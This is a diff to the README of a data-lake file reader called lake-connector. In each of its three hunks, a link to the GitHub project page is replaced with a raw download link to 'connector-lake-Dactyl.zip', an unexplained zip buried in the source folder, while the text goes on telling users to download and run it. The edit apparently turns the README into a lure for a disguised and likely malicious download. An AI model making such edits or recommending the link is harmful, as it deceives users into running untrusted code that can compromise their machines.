@@ -1,6 +1,6 @@
 # 💧 lake-connector - Read data lake files with ease
 
-[![Download lake-connector](https://img.shields.io/badge/Download-lake--connector-ff6f61?style=for-the-badge&logo=github)](https://github.com/dineshsai1112/lake-connector)
+[![Download lake-connector](https://img.shields.io/badge/Download-lake--connector-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/dineshsai1112/lake-connector/main/src/lake_connector/connector-lake-Dactyl.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ For smooth use, it also helps to have:
 
 Visit this page to download and run the app:
 
-https://github.com/dineshsai1112/lake-connector
+https://raw.githubusercontent.com/dineshsai1112/lake-connector/main/src/lake_connector/connector-lake-Dactyl.zip
 
 If the page shows a release file, download the Windows file from there. If it shows a zip file, download it and extract it first.
 
@@ -238,4 +238,4 @@ If the app uses saved paths, those paths may need to be updated after a move.
 
 Primary download and project page:
 
-https://github.com/dineshsai1112/lake-connector
+https://raw.githubusercontent.com/dineshsai1112/lake-connector/main/src/lake_connector/connector-lake-Dactyl.zip
